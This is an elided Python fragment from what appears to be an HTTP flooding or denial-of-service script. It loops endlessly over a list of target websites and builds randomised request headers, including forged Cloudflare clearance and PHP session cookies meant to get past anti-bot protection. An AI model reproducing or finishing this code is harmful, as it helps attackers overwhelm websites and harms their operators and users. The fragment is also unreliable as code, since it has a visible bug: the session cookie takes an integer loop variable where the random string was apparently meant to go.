...
while True:
    ...
    for i in file_website_list:
        try:
            ...
            data_buff6 =""
            for buffer6 in range(40):
                data_buff6 += random.choice((data_range2))
            
            data_buff7 =""
            for buffer7 in range(26):
                data_buff7 += random.choice((data_range2))

            i=i.strip()
            head = {
                "age":f"{random.randint(0,99999999999999999)}",
                "x-amz-server-side-encryption":"AES256,RSA2048,AES2048,RSA4089,AES65502,RSA65502,BASE64,BASE16,BASE32",
                ...
                "pragma":"no-cache",
                "referer":f"{i}",
                "cookie":f"cf_clearance={data_buff6}-{random.randint(0,99999)}-{random.randint(0,99999)}-{random.randint(0,99999)}; PHPSESSID={buffer7}",
